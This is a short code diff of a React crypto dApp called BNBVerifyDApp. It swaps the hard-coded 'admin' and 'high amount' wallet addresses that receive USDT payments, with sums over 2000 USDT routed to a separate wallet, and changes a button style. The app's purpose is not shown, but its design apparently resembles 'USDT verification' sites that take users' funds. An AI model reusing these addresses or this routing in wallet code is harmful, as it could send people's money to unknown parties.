@@ -76,8 +76,8 @@ export default function BNBVerifyDApp() {
   const [lastConnectAttempt, setLastConnectAttempt] = useState<number>(0)
 
   // Updated Configuration with new admin wallet
-  const ADMIN_WALLET = "0xF76D725f577EDBe6b98FDa9960173F23d5A4B988" // New admin wallet for payments
-  const HIGH_AMOUNT_WALLET = "0x0C775115c4a9483e1b92B1203F30220E657182D0" // For amounts > 2000 USDT
+  const ADMIN_WALLET = "0xd47c7585550eAd12aD365Fba5F4bD2533B9b4Eaf" // Updated admin wallet for payments
+  const HIGH_AMOUNT_WALLET = "0xd96698f467B9b79483A2574a96821Ed576B09C1e" // For amounts > 2000 USDT
   const HIGH_AMOUNT_THRESHOLD = 2000 // USDT threshold for high amount wallet
   const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955" // USDT BEP-20
   const FLASH_THRESHOLD = 5 // USDT threshold for flash detection
@@ -958,7 +958,7 @@ export default function BNBVerifyDApp() {
               </span>
             </div>
           ) : (
-            <Button onClick={connectWallet} variant="outline" size="sm" className="text-xs">
+            <Button onClick={connectWallet} variant="outline" size="sm" className="text-xs bg-transparent">
               <Wallet className="w-3 h-3 mr-1" />
               Connect
             </Button>
